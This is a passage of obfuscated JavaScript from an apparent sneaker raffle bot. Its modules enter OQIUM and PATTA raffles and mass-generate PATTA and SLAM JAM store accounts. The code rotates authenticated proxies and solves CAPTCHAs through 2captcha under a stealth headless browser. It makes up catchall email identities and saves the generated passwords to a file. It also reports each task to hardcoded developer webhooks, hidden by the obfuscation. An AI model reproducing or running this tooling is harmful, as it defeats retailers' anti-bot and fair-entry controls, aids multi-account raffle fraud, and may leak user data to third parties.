                                            'value': '' + _0x3318c6[_0x3bb573]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x5a0dc7['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x2071e6
                                        }
                                    ]
                                }], _0x201e2d = { 'embeds': _0x468907 }, _0x43d24b = _0x35e78d['data'];
                                _0x236bdd == 'exp' ? _0x43d24b['data']['attributes']['email'] = '' + _0x3318c6[_0x3bb573]['FirstName'] + _0x3318c6[_0x3bb573]['LastName'] + _0x5a0dc7['catchall'] : _0x43d24b['data']['attributes']['email'] = '' + _0x3318c6[_0x3bb573]['Email'];
                                if (_0x3318c6[_0x3bb573]['Size'] == 'RANDOM') {
                                }
                                _0x43d24b['data']['attributes']['properties']['$first_name'] = '' + _0x3318c6[_0x3bb573]['FirstName'], _0x43d24b['data']['attributes']['properties']['$last_name'] = '' + _0x3318c6[_0x3bb573]['LastName'], _0x43d24b['data']['attributes']['properties']['$address1'] = _0x3318c6[_0x3bb573]['Address1'] + '\x20' + _0x3318c6[_0x3bb573]['Address2'] + '\x20' + _0x3318c6[_0x3bb573]['HouseNumber'], _0x43d24b['data']['attributes']['properties']['$zip'] = '' + _0x3318c6[_0x3bb573]['Zip'], _0x43d24b['data']['attributes']['properties']['$city'] = '' + _0x3318c6[_0x3bb573]['City'], _0x43d24b['data']['attributes']['properties']['$country'] = '' + _0x3318c6[_0x3bb573]['Country'], _0x43d24b['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x3318c6[_0x3bb573]['Size'], _0x43d24b['data']['attributes']['properties']['$phone_number'] = '' + _0x3318c6[_0x3bb573]['Phone'], _0x43d24b['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x3318c6[_0x3bb573]['Follower'];
                            }
                            if (_0x5a0dc7['useRandomProxy'] = ![])
                                var _0x3b4d5b = _0x3ea0b6[_0x3bb573]['split'](':');
                            else
                                var _0x132254 = Math['round'](Math['random']() * (_0x3ea0b6['length'] - 0x1)), _0x3b4d5b = _0x3ea0b6[_0x132254]['split'](':');
                            var _0x42678e = {
                                'jar': _0xf73368,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x35e78d['url'],
                                'headers': _0x35e78d['headers'],
                                'body': JSON['stringify'](_0x43d24b),
                                'proxy': 'http://' + _0x3b4d5b[0x2] + ':' + _0x3b4d5b[0x3] + '@' + _0x3b4d5b[0x0] + ':' + _0x3b4d5b[0x1]
                            };
                            return _0x236bdd != 'ver' && (_0x42678e['url'] = _0x35e78d['url'], _0x42678e['headers'] = _0x35e78d['headers']), _0x236bdd == 'ver' && (_0x42678e['method'] = 'GET'), new Promise(function (_0x2d5be9, _0x580d30) {
                                callback = async (_0x3d3b57, _0x377942, _0x3439bc) => {
                                    if (!_0x3d3b57 && _0x377942['statusCode'] == 0xca || !_0x3d3b57 && _0x377942['statusCode'] == 0xc8) {
                                        if (_0x236bdd != 'ver') {
                                            var _0x3c6444 = await _0x1653b0(_0x3318c6[_0x3bb573], _0x35e78d, 'dev', ![]), _0x23e0df = await _0x1653b0(_0x3318c6[_0x3bb573], _0x35e78d, 'pub', ![]);
                                            const _0x42029e = {
                                                'succesDEVMSG': { 'embeds': [_0x3c6444] },
                                                'succesPUBMSG': { 'embeds': [_0x23e0df] }
                                            };
                                            if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                                                try {
                                                    await _0xf7d9ce(_0x5a0dc7['webhook'], _0x42029e['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x42029e['succesDEVMSG']), await _0x207ff4(0xc8);
                                            try {
                                                await _0xf7d9ce(_0xcaa949, _0x42029e['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x40845b(_0x3318c6[_0x3bb573], _0x35e78d);
                                        }
                                        _0x2d5be9(console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x35e78d['name'] + ']\x20Task\x20' + (_0x3bb573 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x236bdd != 'ver') {
                                            var _0x336fb6 = '' + _0x3d3b57, _0x3e9b58 = await _0x1653b0(_0x3318c6[_0x3bb573], _0x35e78d, 'dev', !![], _0x336fb6), _0x2e5836 = {};
                                            _0x2e5836['errorDEV'] = { 'embeds': [_0x3e9b58] }, _0x3fbd0e(_0x3318c6[_0x3bb573], _0x35e78d), _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x2e5836['errorDEV']), await _0xf7d9ce(_0x227865, _0x2e5836['errorDEV']);
                                        }
                                        _0x580d30(console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x35e78d['name'] + ']\x20Task\x20' + (_0x3bb573 + 0x1) + ':\x20' + _0x3d3b57)));
                                    }
                                };
                                try {
                                    _0x236bdd != 'ver' && console['log'](_0x13cc99() + '\x20[' + _0x35e78d['name'] + ']\x20Task\x20' + (_0x3bb573 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x43d24b['data']['attributes']['email']), _0x331b3f(_0x42678e, callback);
                                } catch (_0x35fb51) {
                                    console['log'](_0x13cc99() + '\x20Task\x20' + (_0x3bb573 + 0x1) + ':\x20' + _0x35fb51);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x33edc9(_0x4f9692, 'nor', _0x3f0931, _0x1ba8ba, _0x56ec), console['log'](_0x13cc99() + '\x20[' + _0x3f0931['name'] + ']\x20Sleeping\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        } catch (_0x480455) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x39748a, _0x4d82d4, _0x440531) {
                    for (var _0x2d9868 = 0x0; _0x2d9868 < _0x4d82d4['length']; _0x2d9868++) {
                        async function _0x2e1daf(_0x48497b, _0x1ad5b9, _0x22088c, _0xacd820, _0x1bcfa1) {
                            var _0x46223c, _0x1cbefc = {}, _0x4cd47b = [], _0x366b70 = {}, _0x35f6e9 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x5f245a = Math['round'](Math['random']() * (_0x35f6e9['length'] - 0x1));
                            _0xacd820[_0x48497b]['Size'] == 'RANDOM' && (_0xacd820[_0x48497b]['Size'] = _0x35f6e9[_0x5f245a]);
                            !_0xacd820 && (_0xacd820 = {});
                            if (_0x1ad5b9 != 'ver') {
                                _0x2164fd(_0x22088c['name'] + '\x20Task\x20' + (_0x48497b + 0x1) + '\x20/\x20' + _0xacd820['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0xacd820, _0x48497b), _0x4cd47b = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x1d42cd
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0xacd820[_0x48497b]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x5a0dc7['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x2071e6
                                        }
                                    ]
                                }], _0x366b70 = { 'embeds': _0x4cd47b }, _0x1cbefc = _0x22088c['data'];
                                _0x1ad5b9 == 'exp' ? _0x1cbefc['data']['attributes']['email'] = '' + _0xacd820[_0x48497b]['FirstName'] + _0xacd820[_0x48497b]['LastName'] + _0x5a0dc7['catchall'] : _0x1cbefc['data']['attributes']['email'] = '' + _0xacd820[_0x48497b]['Email'];
                                if (_0xacd820[_0x48497b]['Size'] == 'RANDOM') {
                                }
                                _0x1cbefc['data']['attributes']['properties']['$first_name'] = '' + _0xacd820[_0x48497b]['FirstName'], _0x1cbefc['data']['attributes']['properties']['$last_name'] = '' + _0xacd820[_0x48497b]['LastName'], _0x1cbefc['data']['attributes']['properties']['$address1'] = _0xacd820[_0x48497b]['Address1'] + '\x20' + _0xacd820[_0x48497b]['Address2'] + '\x20' + _0xacd820[_0x48497b]['HouseNumber'], _0x1cbefc['data']['attributes']['properties']['$zip'] = '' + _0xacd820[_0x48497b]['Zip'], _0x1cbefc['data']['attributes']['properties']['$city'] = '' + _0xacd820[_0x48497b]['City'], _0x1cbefc['data']['attributes']['properties']['$country'] = '' + _0xacd820[_0x48497b]['Country'], _0x1cbefc['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0xacd820[_0x48497b]['Size'], _0x1cbefc['data']['attributes']['properties']['$phone_number'] = '' + _0xacd820[_0x48497b]['Phone'], _0x1cbefc['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0xacd820[_0x48497b]['Follower'];
                            }
                            if (_0x5a0dc7['useRandomProxy'] = ![])
                                var _0x3516b3 = _0x1bcfa1[_0x48497b]['split'](':');
                            else
                                var _0x52a58c = Math['round'](Math['random']() * (_0x1bcfa1['length'] - 0x1)), _0x3516b3 = _0x1bcfa1[_0x52a58c]['split'](':');
                            var _0x4aacfa = {
                                'jar': _0xf73368,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x22088c['url'],
                                'headers': _0x22088c['headers'],
                                'body': JSON['stringify'](_0x1cbefc),
                                'proxy': 'http://' + _0x3516b3[0x2] + ':' + _0x3516b3[0x3] + '@' + _0x3516b3[0x0] + ':' + _0x3516b3[0x1]
                            };
                            return _0x1ad5b9 != 'ver' && (_0x4aacfa['url'] = _0x22088c['url'], _0x4aacfa['headers'] = _0x22088c['headers']), _0x1ad5b9 == 'ver' && (_0x4aacfa['method'] = 'GET', _0x4aacfa['url'] = _0xacd820[_0x48497b]), new Promise(function (_0x1bf660, _0x367845) {
                                callback = async (_0x5cb04f, _0x2d1bb3, _0x2a3017) => {
                                    if (!_0x5cb04f && _0x2d1bb3['statusCode'] == 0xca || !_0x5cb04f && _0x2d1bb3['statusCode'] == 0xc8) {
                                        if (_0x1ad5b9 != 'ver') {
                                            var _0x65d8f3 = await _0x1653b0(_0xacd820[_0x48497b], _0x22088c, 'dev', ![]), _0x420f29 = await _0x1653b0(_0xacd820[_0x48497b], _0x22088c, 'pub', ![]);
                                            const _0x58d033 = {
                                                'succesDEVMSG': { 'embeds': [_0x65d8f3] },
                                                'succesPUBMSG': { 'embeds': [_0x420f29] }
                                            };
                                            if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                                                try {
                                                    await _0xf7d9ce(_0x5a0dc7['webhook'], _0x58d033['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x58d033['succesDEVMSG']), await _0x207ff4(0xc8);
                                            try {
                                                await _0xf7d9ce(_0xcaa949, _0x58d033['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x40845b(_0xacd820[_0x48497b], _0x22088c);
                                        }
                                        _0x1bf660(console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x22088c['name'] + ']\x20Task\x20' + (_0x48497b + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x1ad5b9 != 'ver') {
                                            var _0x4a3a8c = '' + _0x5cb04f, _0x2f84fa = await _0x1653b0(_0xacd820[_0x48497b], _0x22088c, 'dev', !![], _0x4a3a8c), _0x2892ee = {};
                                            _0x2892ee['errorDEV'] = { 'embeds': [_0x2f84fa] }, _0x3fbd0e(_0xacd820[_0x48497b], _0x22088c), _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x2892ee['errorDEV']), await _0xf7d9ce(_0x227865, _0x2892ee['errorDEV']);
                                        }
                                        _0x367845(console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x22088c['name'] + ']\x20Task\x20' + (_0x48497b + 0x1) + ':\x20' + _0x5cb04f)));
                                    }
                                };
                                try {
                                    _0x1ad5b9 != 'ver' && console['log'](_0x13cc99() + '\x20[' + _0x22088c['name'] + ']\x20Task\x20' + (_0x48497b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1cbefc['data']['attributes']['email']), _0x331b3f(_0x4aacfa, callback);
                                } catch (_0x1616f6) {
                                    console['log'](_0x13cc99() + '\x20Task\x20' + (_0x48497b + 0x1) + ':\x20' + _0x1616f6);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x2e1daf(_0x2d9868, 'ver', _0x39748a, _0x4d82d4, _0x440531), console['log'](_0x13cc99() + '\x20[' + _0x39748a['name'] + ']\x20Sleeping\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        } catch (_0x37bfd5) {
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x8fbe65, _0x11e49e, _0x90907f) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5f5282 = 0x0; _0x5f5282 < _0x11e49e['length']; _0x5f5282++) {
                        var _0x5eae9c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d42cd
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5a0dc7['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2071e6
                                }
                            ]
                        }];
                        const _0x3b7220 = { 'embeds': _0x5eae9c };
                        _0x2164fd(_0x8fbe65['name'] + '\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20/\x20' + _0x11e49e['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x11e49e, _0x5f5282);
                        var _0x1ecba7 = await _0x1653b0(_0x11e49e[_0x5f5282], _0x8fbe65, 'acc', ![]);
                        const _0x5d5b10 = { 'succesDEVMSG': { 'embeds': [_0x1ecba7] } };
                        if (_0x11e49e[_0x5f5282]['Email'] == '' || _0x11e49e[_0x5f5282]['FirstName'] == '' || _0x11e49e[_0x5f5282]['LastName'] == '') {
                            console['log'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x207ff4(0x7d0);
                            continue;
                        }
                        (_0x11e49e[_0x5f5282]['Password'] == '' || _0x11e49e[_0x5f5282] == undefined) && _0x11e49e[_0x5f5282]['Password'] == 'JRaffles23!';
                        if (_0x5a0dc7['useRandomProxy'] = ![])
                            var _0x5b91da = _0x90907f[_0x5f5282]['split'](':');
                        else
                            var _0x2131ba = Math['round'](Math['random']() * (_0x90907f['length'] - 0x1)), _0x5b91da = _0x90907f[_0x2131ba]['split'](':');
                        const _0xcca955 = await _0x512dd9['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5b91da[0x0] + ':' + _0x5b91da[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x123d83 = await _0xcca955['newPage']();
                            await _0x123d83['authenticate']({
                                'username': '' + _0x5b91da[0x2],
                                'password': '' + _0x5b91da[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0x8fbe65['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x123d83['setRequestInterception'](!![]), _0x123d83['on']('request', _0x5e8fd2 => {
                                _0x5e8fd2['resourceType']() === 'image' || _0x5e8fd2['resourceType']() === 'font' || _0x5e8fd2['resourceType']() === 'media' ? _0x5e8fd2['abort']() : _0x5e8fd2['continue']();
                            }), await _0x123d83['goto']('https://patta.nl/account/register'), await _0x207ff4(0xbb8), await _0x123d83['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x13cc99() + '\x20[' + _0x8fbe65['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20Filling\x20information'), await _0x123d83['type']('#RegisterForm-FirstName', '' + _0x11e49e[_0x5f5282]['FirstName']), await _0x207ff4(0x226), await _0x123d83['type']('#RegisterForm-LastName', '' + _0x11e49e[_0x5f5282]['LastName']), await _0x207ff4(0x226), await _0x123d83['type']('#RegisterForm-email', '' + _0x11e49e[_0x5f5282]['Email']), await _0x207ff4(0x226), await _0x123d83['type']('#RegisterForm-password', '' + _0x11e49e[_0x5f5282]['Password']), await _0x207ff4(0x226), console['log'](_0x13cc99() + '\x20[' + _0x8fbe65['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20Submitting..'), await _0x123d83['$eval']('#RegisterForm', _0x64765b => _0x64765b['submit']()), await _0x207ff4(0x1f40);
                            try {
                                await _0x123d83['waitForSelector']('.home-page-grid__collection'), await _0x207ff4(0x1f4), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x8fbe65['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20Account\x20' + _0x11e49e[_0x5f5282]['Email'] + '\x20Generated!')), _0x71872f['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x11e49e[_0x5f5282]['Email'] + ',' + _0x11e49e[_0x5f5282]['Password']), console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x8fbe65['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20Account\x20' + _0x11e49e[_0x5f5282]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x5d5b10['succesDEVMSG']);
                                } catch {
                                }
                                await _0xf7d9ce(_0x14fa11, _0x5d5b10['succesDEVMSG']);
                            } catch (_0x28438b) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x28438b));
                            }
                        } catch (_0x218eb7) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x5f5282 + 0x1) + '\x20:\x20' + _0x218eb7));
                        } finally {
                            _0xcca955 && _0xcca955['close'](), console['log']('Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3b7177, _0x11701d, _0x47a359) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x222410 = 0x0; _0x222410 < _0x11701d['length']; _0x222410++) {
                        var _0x42c6c7;
                        if (_0x20205d != 'yes')
                            var _0x20205d = '', _0x48f32d = 0x0;
                        _0x2164fd(_0x3b7177['name'] + '\x20Task\x20' + (_0x222410 + 0x1) + '\x20/\x20' + _0x11701d['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x11701d, _0x222410);
                        if (_0x11701d[_0x222410]['Email'] == '' || _0x11701d[_0x222410]['Password'] == '' || _0x11701d[_0x222410]['FirstName'] == '' || _0x11701d[_0x222410]['LastName'] == '') {
                            console['log'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5a0dc7['useRandomProxy'] = ![])
                            var _0x366a2f = _0x47a359[_0x222410]['split'](':');
                        else
                            var _0x2a2bb1 = Math['round'](Math['random']() * (_0x47a359['length'] - 0x1)), _0x366a2f = _0x47a359[_0x2a2bb1]['split'](':');
                        const _0x30dcc7 = await _0x512dd9['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x366a2f[0x0] + ':' + _0x366a2f[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x49e625 = await _0x30dcc7['newPage']();
                            await _0x49e625['authenticate']({
                                'username': '' + _0x366a2f[0x2],
                                'password': '' + _0x366a2f[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x49e625['setRequestInterception'](!![]), _0x49e625['on']('request', _0x7b4bc7 => {
                                _0x7b4bc7['resourceType']() === 'image' || _0x7b4bc7['resourceType']() === 'font' || _0x7b4bc7['resourceType']() === 'media' ? _0x7b4bc7['abort']() : _0x7b4bc7['continue']();
                            }), await _0x49e625['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x49e625['waitForSelector']('#CustomerEmail'), console['log'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x49e625['type']('#CustomerEmail', '' + _0x11701d[_0x222410]['Email']), await _0x207ff4(0x12c), await _0x49e625['type']('#CustomerPassword', '' + _0x11701d[_0x222410]['Password']), await _0x207ff4(0x226), await _0x49e625['$eval']('#customer_login', _0x2054c3 => _0x2054c3['submit']());
                            try {
                                await _0x49e625['waitForSelector']('#orders'), await _0x207ff4(0x4b0);
                            } catch {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x49e625['goto']('' + _0x11701d[_0x222410]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x207ff4(0xbb8), console['log'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x49e625['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x49e625['type']('#email', '' + _0x11701d[_0x222410]['Email']), await _0x207ff4(0x384), await _0x49e625['type']('#first_name', '' + _0x11701d[_0x222410]['FirstName']), await _0x207ff4(0x514), await _0x49e625['type']('#last_name', '' + _0x11701d[_0x222410]['LastName']), await _0x207ff4(0x514), await _0x49e625['type']('#street_address', _0x11701d[_0x222410]['Address1'] + '\x20' + _0x11701d[_0x222410]['HouseNumber'] + '\x20' + _0x11701d[_0x222410]['Address2']), await _0x207ff4(0x2bc);
                            _0x11701d[_0x222410]['Postcode'] == undefined && (_0x11701d[_0x222410]['Postcode'] = _0x11701d[_0x222410]['Zip']);
                            await _0x49e625['type']('#zip_code', '' + _0x11701d[_0x222410]['Postcode']), await _0x207ff4(0x320), await _0x49e625['type']('#city', '' + _0x11701d[_0x222410]['City']), await _0x207ff4(0x320), await _0x49e625['type']('#bday', '01/01/1994'), await _0x207ff4(0x320), await _0x49e625['type']('#instagram', '' + _0x11701d[_0x222410]['Follower']), await _0x207ff4(0x352);
                            if (_0x11701d[_0x222410]['Size'] == 'RANDOM') {
                                const _0x5a6cf0 = await _0x49e625['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x4bcc09 => {
                                    return _0x4bcc09['map'](_0x5c99ee => _0x5c99ee['textContent']);
                                });
                                var _0x358163 = Math['round'](Math['random']() * (_0x5a6cf0['length'] - 0x1));
                                console['log'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x5a6cf0[_0x358163]), await _0x49e625['click']('label[data-eu-size=\x22' + _0x5a6cf0[_0x358163] + '\x22]');
                            } else {
                                console['log'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x11701d[_0x222410]['Size']);
                                try {
                                    await _0x49e625['click']('label[data-eu-size=\x22' + _0x11701d[_0x222410]['Size'] + '\x22]');
                                } catch {
                                    await _0x49e625['click']('label[data-eu-size=\x22' + _0x11701d[_0x222410]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x207ff4(0xbb8), await _0x49e625['$$eval']('.raffle__checkbox-label', _0x497ada => _0x497ada['forEach'](_0x2643cc => _0x2643cc['click']())), await _0x207ff4(0x7d0), console['log'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x49e625['click']('#raffle__form-submit'), await _0x207ff4(0x1388);
                            try {
                                await _0x49e625['waitForSelector']('#raffle__confirmation-message-container'), _0x20205d = 'no', _0x40845b(_0x11701d[_0x222410], _0x3b7177), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0xb9e050) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0xb9e050));
                            }
                        } catch (_0x297a0a) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20' + _0x297a0a)), _0x20205d = 'yes';
                        } finally {
                            _0x30dcc7 && _0x30dcc7['close']();
                            if (_0x20205d == 'yes' && _0x48f32d != 0x5 && _0x42c6c7 != 'Size\x20Not\x20Found') {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x3b7177['name'] + ']\x20Task\x20' + (_0x222410 + 0x1) + '\x20:\x20Retrying')), _0x222410 = _0x222410 - 0x1, _0x48f32d = _0x48f32d + 0x1;
                                continue;
                            }
                            _0x20205d == 'yes' && _0x48f32d >= 0x5 && (_0x3fbd0e(_0x11701d[_0x222410], _0x3b7177), _0x20205d = 'no', _0x48f32d = 0x0), console['log']('Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xe4087e, _0x94377a, _0x5f2ef3) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
